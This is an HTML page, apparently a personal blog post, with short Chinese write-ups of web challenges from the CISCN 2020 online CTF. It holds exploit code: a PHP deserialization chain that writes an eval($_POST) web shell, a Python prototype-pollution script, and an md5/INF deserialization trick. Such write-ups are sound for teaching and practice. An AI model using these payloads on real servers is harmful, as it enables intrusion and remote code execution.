@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>ciscn2020_online | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="http://localhost:1313/posts/ctf-ciscn2020-online/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/flash.ico">
+<link rel="apple-touch-icon" href="http://localhost:1313/flash.ico">
+<link rel="mask-icon" href="http://localhost:1313/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ctf-ciscn2020-online/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="http://localhost:1313/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      ciscn2020_online
+    </h1>
+    <div class="post-meta"><span title='2020-08-20 13:16:50 +0000 UTC'>August 20, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;306 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#easyphp">easyphp</a></li>
+    <li><a href="#babyunserialize">babyunserialize</a></li>
+    <li><a href="#littlegame">littlegame</a></li>
+    <li><a href="#rceme">rceme</a></li>
+    <li><a href="#easytrick">easytrick</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p>web越來越没有牌面了&hellip;国赛果然是pwn和misc的天下</p></blockquote>
+<h2 id="easyphp">easyphp<a hidden class="anchor" aria-hidden="true" href="#easyphp">#</a></h2>
+<p>要让子进程异常退出, 先打印出php的所有内置函数然后爆破发包发现这个函数可以让他异常退出</p>
+<div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a=stream_socket_server
+</span></span></code></pre></div><p><img alt="image-20211114141205658" loading="lazy" src="/images/ciscn2020-online/image-20211114141205658.png"></p>
+<h2 id="babyunserialize">babyunserialize<a hidden class="anchor" aria-hidden="true" href="#babyunserialize">#</a></h2>
+<p>传入flag并对flag进行反序列化, 搜索<code>__destruct</code>函数后决定用<code>jip.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        <span style="color:#8839ef">function</span> <span style="color:#1e66f5">__destruct</span>() {
+</span></span><span style="display:flex;"><span>                <span style="color:#8839ef">if</span> (<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">lazy</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">lazy</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#8839ef">FALSE</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#8839ef">foreach</span> (<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">data</span><span style="color:#04a5e5;font-weight:bold">?:</span>[] <span style="color:#8839ef">as</span> <span style="color:#dc8a78">$file</span> <span style="color:#04a5e5;font-weight:bold">=&gt;</span> <span style="color:#dc8a78">$data</span>)
+</span></span><span style="display:flex;"><span>                                <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">write</span>(<span style="color:#dc8a78">$file</span>,<span style="color:#dc8a78">$data</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        <span style="color:#8839ef">function</span> <span style="color:#1e66f5">write</span>(<span style="color:#dc8a78">$file</span>,<span style="color:#8839ef">array</span> <span style="color:#dc8a78">$data</span><span style="color:#04a5e5;font-weight:bold">=</span><span style="color:#8839ef">NULL</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#8839ef">if</span> (<span style="color:#04a5e5;font-weight:bold">!</span><span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">dir</span> <span style="color:#04a5e5;font-weight:bold">||</span> <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">lazy</span>)
+</span></span><span style="display:flex;"><span>                        <span style="color:#8839ef">return</span> count(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">data</span>[<span style="color:#dc8a78">$file</span>]<span style="color:#04a5e5;font-weight:bold">=</span><span style="color:#dc8a78">$data</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#dc8a78">$fw</span><span style="color:#04a5e5;font-weight:bold">=</span>\Base<span style="color:#04a5e5;font-weight:bold">::</span><span style="color:#1e66f5">instance</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#8839ef">switch</span> (<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">format</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#8839ef">case</span> self<span style="color:#04a5e5;font-weight:bold">::</span><span style="color:#1e66f5">FORMAT_JSON</span><span style="color:#04a5e5;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#dc8a78">$out</span><span style="color:#04a5e5;font-weight:bold">=</span>json_encode(<span style="color:#dc8a78">$data</span>,JSON_PRETTY_PRINT);
+</span></span><span style="display:flex;"><span>                                <span style="color:#8839ef">break</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#8839ef">case</span> self<span style="color:#04a5e5;font-weight:bold">::</span><span style="color:#1e66f5">FORMAT_Serialized</span><span style="color:#04a5e5;font-weight:bold">:</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#dc8a78">$out</span><span style="color:#04a5e5;font-weight:bold">=</span><span style="color:#dc8a78">$fw</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">serialize</span>(<span style="color:#dc8a78">$data</span>);
+</span></span><span style="display:flex;"><span>                                <span style="color:#8839ef">break</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#8839ef">return</span> <span style="color:#dc8a78">$fw</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">write</span>(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">dir</span><span style="color:#04a5e5;font-weight:bold">.</span><span style="color:#dc8a78">$file</span>,<span style="color:#dc8a78">$out</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>exp如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#04a5e5;font-weight:bold">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#8839ef">namespace</span> DB{
+</span></span><span style="display:flex;"><span><span style="color:#8839ef">class</span> <span style="color:#df8e1d">jig</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">const</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#df8e1d">FORMAT_JSON</span><span style="color:#04a5e5;font-weight:bold">=</span><span style="color:#fe640b">1</span>,
+</span></span><span style="display:flex;"><span>        FORMAT_Serialized<span style="color:#04a5e5;font-weight:bold">=</span><span style="color:#fe640b">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">protected</span> <span style="color:#dc8a78">$dir</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">protected</span> <span style="color:#dc8a78">$data</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">protected</span> <span style="color:#dc8a78">$lazy</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">protected</span> <span style="color:#dc8a78">$format</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">public</span> <span style="color:#8839ef">function</span> <span style="color:#1e66f5">__construct</span>(<span style="color:#dc8a78">$dir</span>,<span style="color:#dc8a78">$data</span>,<span style="color:#dc8a78">$lazy</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">data</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#dc8a78">$data</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">dir</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#dc8a78">$dir</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">lazy</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#dc8a78">$lazy</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">format</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#fe640b">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8839ef">namespace</span> ddd{
+</span></span><span style="display:flex;"><span><span style="color:#dc8a78">$a</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#8839ef">new</span> \DB\jig(<span style="color:#40a02b">&#34;/var/www/html/&#34;</span>, [<span style="color:#40a02b">&#34;kkk.php&#34;</span><span style="color:#04a5e5;font-weight:bold">=&gt;</span> [<span style="color:#40a02b">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span>]], <span style="color:#8839ef">True</span>);
+</span></span><span style="display:flex;"><span><span style="color:#8839ef">echo</span> urlencode(serialize(<span style="color:#dc8a78">$a</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#9ca0b0;font-style:italic">?&gt;</span><span style="color:#d20f39">
+</span></span></span></code></pre></div><h2 id="littlegame">littlegame<a hidden class="anchor" aria-hidden="true" href="#littlegame">#</a></h2>
+<p>javascript原型链污染</p>
+<p>关键代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>router.post(<span style="color:#40a02b">&#34;/DeveloperControlPanel&#34;</span>, <span style="color:#d20f39">function</span> (req, res, next) {
+</span></span><span style="display:flex;"><span>    <span style="color:#9ca0b0;font-style:italic">// not implement
+</span></span></span><span style="display:flex;"><span><span style="color:#9ca0b0;font-style:italic"></span>    <span style="color:#8839ef">if</span> (req.body.key <span style="color:#04a5e5;font-weight:bold">===</span> <span style="color:#fe640b">undefined</span> <span style="color:#04a5e5;font-weight:bold">||</span> req.body.password <span style="color:#04a5e5;font-weight:bold">===</span> <span style="color:#fe640b">undefined</span>){
+</span></span><span style="display:flex;"><span>        res.send(<span style="color:#40a02b">&#34;What&#39;s your problem?&#34;</span>);
+</span></span><span style="display:flex;"><span>    }<span style="color:#8839ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d20f39">let</span> key <span style="color:#04a5e5;font-weight:bold">=</span> req.body.key.toString();
+</span></span><span style="display:flex;"><span>        <span style="color:#d20f39">let</span> password <span style="color:#04a5e5;font-weight:bold">=</span> req.body.password.toString();
+</span></span><span style="display:flex;"><span>        <span style="color:#8839ef">if</span>(Admin[key] <span style="color:#04a5e5;font-weight:bold">===</span> password){
+</span></span><span style="display:flex;"><span>            res.send(process.env.flag);
+</span></span><span style="display:flex;"><span>        }<span style="color:#8839ef">else</span> {
+</span></span><span style="display:flex;"><span>            res.send(<span style="color:#40a02b">&#34;Wrong password!Are you Admin?&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>router.get(<span style="color:#40a02b">&#39;/SpawnPoint&#39;</span>, <span style="color:#d20f39">function</span> (req, res, next) {
+</span></span><span style="display:flex;"><span>    req.session.knight <span style="color:#04a5e5;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#40a02b">&#34;HP&#34;</span><span style="color:#04a5e5;font-weight:bold">:</span> <span style="color:#fe640b">1000</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#40a02b">&#34;Gold&#34;</span><span style="color:#04a5e5;font-weight:bold">:</span> <span style="color:#fe640b">10</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#40a02b">&#34;Firepower&#34;</span><span style="color:#04a5e5;font-weight:bold">:</span> <span style="color:#fe640b">10</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    res.send(<span style="color:#40a02b">&#34;Let&#39;s begin!&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>router.post(<span style="color:#40a02b">&#34;/Privilege&#34;</span>, <span style="color:#d20f39">function</span> (req, res, next) {
+</span></span><span style="display:flex;"><span>    <span style="color:#9ca0b0;font-style:italic">// Why not ask witch for help?
+</span></span></span><span style="display:flex;"><span><span style="color:#9ca0b0;font-style:italic"></span>    <span style="color:#8839ef">if</span>(req.session.knight <span style="color:#04a5e5;font-weight:bold">===</span> <span style="color:#fe640b">undefined</span>){
+</span></span><span style="display:flex;"><span>        res.redirect(<span style="color:#40a02b">&#39;/SpawnPoint&#39;</span>);
+</span></span><span style="display:flex;"><span>    }<span style="color:#8839ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#8839ef">if</span> (req.body.NewAttributeKey <span style="color:#04a5e5;font-weight:bold">===</span> <span style="color:#fe640b">undefined</span> <span style="color:#04a5e5;font-weight:bold">||</span> req.body.NewAttributeValue <span style="color:#04a5e5;font-weight:bold">===</span> <span style="color:#fe640b">undefined</span>) {
+</span></span><span style="display:flex;"><span>            res.send(<span style="color:#40a02b">&#34;What&#39;s your problem?&#34;</span>);
+</span></span><span style="display:flex;"><span>        }<span style="color:#8839ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#d20f39">let</span> key <span style="color:#04a5e5;font-weight:bold">=</span> req.body.NewAttributeKey.toString();
+</span></span><span style="display:flex;"><span>            <span style="color:#d20f39">let</span> value <span style="color:#04a5e5;font-weight:bold">=</span> req.body.NewAttributeValue.toString();
+</span></span><span style="display:flex;"><span>            setFn(req.session.knight, key, value);
+</span></span><span style="display:flex;"><span>            res.send(<span style="color:#40a02b">&#34;Let&#39;s have a check!&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>污染<code>req.session.knight</code></p>
+<p>exp如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#179299">import</span> <span style="color:#fe640b">requests</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#40a02b">&#34;http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data1 <span style="color:#04a5e5;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#40a02b">&#34;NewAttributeKey&#34;</span>:<span style="color:#40a02b">&#34;constructor.prototype.ch4ser&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#40a02b">&#34;NewAttributeValue&#34;</span>:<span style="color:#40a02b">&#34;1234&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data2 <span style="color:#04a5e5;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#40a02b">&#34;key&#34;</span>:<span style="color:#40a02b">&#39;ch4ser&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#40a02b">&#39;password&#39;</span>:<span style="color:#40a02b">&#39;1234&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sess <span style="color:#04a5e5;font-weight:bold">=</span> requests<span style="color:#04a5e5;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>sess<span style="color:#04a5e5;font-weight:bold">.</span>get(url<span style="color:#04a5e5;font-weight:bold">+</span><span style="color:#40a02b">&#34;SpawnPoint&#34;</span>)
+</span></span><span style="display:flex;"><span>sess<span style="color:#04a5e5;font-weight:bold">.</span>post(url<span style="color:#04a5e5;font-weight:bold">+</span><span style="color:#40a02b">&#34;Privilege&#34;</span>,data<span style="color:#04a5e5;font-weight:bold">=</span>data1)
+</span></span><span style="display:flex;"><span>r <span style="color:#04a5e5;font-weight:bold">=</span> sess<span style="color:#04a5e5;font-weight:bold">.</span>post(url<span style="color:#04a5e5;font-weight:bold">+</span><span style="color:#40a02b">&#34;DeveloperControlPanel&#34;</span>,data<span style="color:#04a5e5;font-weight:bold">=</span>data2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#04a5e5">print</span>(r<span style="color:#04a5e5;font-weight:bold">.</span>text)
+</span></span></code></pre></div><h2 id="rceme">rceme<a hidden class="anchor" aria-hidden="true" href="#rceme">#</a></h2>
+<p>搜索发现https://www.anquanke.com/post/id/212603#h2-0, 拿着payload直接打就可以了</p>
+<h2 id="easytrick">easytrick<a hidden class="anchor" aria-hidden="true" href="#easytrick">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#4c4f69;background-color:#eff1f5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#04a5e5;font-weight:bold">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#8839ef">class</span> <span style="color:#df8e1d">trick</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">public</span> <span style="color:#dc8a78">$trick1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">public</span> <span style="color:#dc8a78">$trick2</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">public</span> <span style="color:#8839ef">function</span> <span style="color:#1e66f5">__construct</span>(<span style="color:#dc8a78">$a</span>, <span style="color:#dc8a78">$b</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#dc8a78">$a</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick2</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#dc8a78">$b</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#8839ef">public</span> <span style="color:#8839ef">function</span> <span style="color:#1e66f5">__destruct</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span> <span style="color:#04a5e5;font-weight:bold">=</span> (string)<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#8839ef">if</span>(strlen(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span>) <span style="color:#04a5e5;font-weight:bold">&gt;</span> <span style="color:#fe640b">5</span> <span style="color:#04a5e5;font-weight:bold">||</span> strlen(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick2</span>) <span style="color:#04a5e5;font-weight:bold">&gt;</span> <span style="color:#fe640b">5</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#8839ef">die</span>(<span style="color:#40a02b">&#34;你太长了&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#8839ef">if</span>(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span> <span style="color:#04a5e5;font-weight:bold">!==</span> <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick2</span> <span style="color:#04a5e5;font-weight:bold">&amp;&amp;</span> md5(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span>) <span style="color:#04a5e5;font-weight:bold">===</span> md5(<span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick2</span>) <span style="color:#04a5e5;font-weight:bold">&amp;&amp;</span> <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick1</span> <span style="color:#04a5e5;font-weight:bold">!=</span> <span style="color:#dc8a78">$this</span><span style="color:#04a5e5;font-weight:bold">-&gt;</span><span style="color:#1e66f5">trick2</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#8839ef">echo</span> file_get_contents(<span style="color:#40a02b">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dc8a78">$a</span> <span style="color:#04a5e5;font-weight:bold">=</span> <span style="color:#8839ef">new</span> trick(INF, INF);
+</span></span><span style="display:flex;"><span><span style="color:#8839ef">echo</span> urlencode(serialize(<span style="color:#dc8a78">$a</span>));
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/posts/sec-http-smuggling/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>http请求走私笔记</span>
+  </a>
+  <a class="next" href="http://localhost:1313/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/">
+    <span class="title">Next »</span>
+    <br>
+    <span>网鼎杯2020 web</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
